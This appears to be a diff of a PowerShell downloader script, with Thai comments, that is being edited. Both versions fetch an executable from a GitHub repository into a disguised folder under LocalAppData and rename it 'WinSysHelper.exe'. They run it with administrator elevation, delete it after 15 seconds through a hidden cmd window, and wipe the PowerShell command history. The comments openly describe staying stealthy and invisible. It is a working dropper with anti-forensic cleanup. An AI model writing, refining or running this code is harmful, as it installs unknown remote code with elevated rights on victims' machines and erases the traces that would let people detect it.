@@ -1,25 +1,25 @@
+# ปิด ErrorAction เพื่อความเงียบ
 $ErrorActionPreference = 'SilentlyContinue'
-$ProgressPreference = 'SilentlyContinue'
 
-# 1. ตั้งที่อยู่ใหม่ (ซ่อนเนียนใน LocalAppData ไม่ต้องขอสิทธิ์สร้าง)
+# 1. โหลดไฟล์ไปไว้ใน LocalAppData (เนียนและไม่ต้องขอสิทธิ์สร้างโฟลเดอร์)
 $dir = "$env:LOCALAPPDATA\Microsoft\Windows\WinSig"
 if (-not (Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force | Out-Null }
 $output = "$dir\WinSysHelper.exe"
 
-# 2. โหลดไฟล์จาก GitHub ของบาส
+# 2. ดาวน์โหลดจาก GitHub
 $url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"
-Invoke-WebRequest -Uri $url -OutFile $output
+(New-Object System.Net.WebClient).DownloadFile($url, $output)
 
-# 3. รันแบบ Admin (เด้ง UAC แน่นอน)
-Start-Process -FilePath $output -Verb RunAs
+# 3. รันแบบ Admin และสั่ง CMD มารอภารกิจลบไฟล์ทิ้งเบื้องหลัง
+if (Test-Path $output) {
+    Start-Process -FilePath $output -Verb RunAs
+    
+    # สั่ง CMD ลบไฟล์และประวัติทิ้งหลังจากผ่านไป 15 วินาที
+    $cmd = "timeout /t 15 && del /f /q `"$output`""
+    Start-Process cmd -ArgumentList "/c $cmd" -WindowStyle Hidden
+}
 
-# 4. จัดการเรื่องประวัติ (ล่องหน)
-try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}
-Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
-
-# 5. สั่งลบไฟล์ทิ้งแบบหน่วงเวลา (ใช้ CMD ช่วยรันเบื้องหลัง)
-# รอ 15 วินาทีเพื่อให้มั่นใจว่า EXE บาสรันขึ้นมาแล้วค่อยลบตัวมันเองทิ้ง
-$cleanup = "timeout /t 15 && del /f /q `"$output`""
-Start-Process cmd -ArgumentList "/c $cleanup" -WindowStyle Hidden
+# 4. ลบประวัติการพิมพ์ใน PowerShell
+try { Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue } catch {}
 
 exit
